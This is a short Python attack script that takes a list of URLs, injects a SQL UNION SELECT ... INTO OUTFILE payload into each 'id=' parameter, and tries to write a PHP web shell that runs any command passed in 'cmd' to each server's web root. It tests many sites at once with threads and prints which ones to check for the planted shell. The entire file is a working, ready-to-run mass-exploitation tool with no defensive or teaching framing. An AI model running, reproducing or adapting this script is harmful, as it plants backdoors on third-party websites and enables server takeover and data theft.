from urllib.parse import urlparse
import requests
import colorama
import sys
import threading

if len(sys.argv) < 2:
    print("\033[37mUsage: python3 " + sys.argv[0] + " [listofurls.txt] \033[37m")
    sys.exit(1)

RCE_payload = "cmd"
payload = f"UNION SELECT '<?php system($_GET['{RCE_payload}']); ?>' INTO OUTFILE '/var/www/html/aeroheadsec.php' "
urls = open(sys.argv[1], "r").read().split("\n")

def run(url):
    if "=" not in url:
        print(f"{colorama.Fore.YELLOW}{url} is not valid.")
        return

    new_url = str(url).replace("id=", f"id='{payload}")
    try:
        output = requests.get(new_url).text.lower()
    except requests.exceptions.ConnectionError:
        print(f"{colorama.Fore.RED}{url}    -      exploit failed")
        return
    if "forbidden" in output:
        print(f"{colorama.Fore.RED}{url}    -      exploit failed")
    elif "you have an error in your sql syntax" in output:
        print(f"{colorama.Fore.RED}{url}    -      has protection")
    else:
        parsed_url = urlparse(url)
        domain = parsed_url.scheme + "://" + parsed_url.netloc
        print(f"{colorama.Fore.GREEN}Check {domain}/aeroheadsec.php")

def threaded_execution(urls):
    threads = []
    for url in urls:
        thread = threading.Thread(target=run, args=(url,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    threaded_execution(urls)
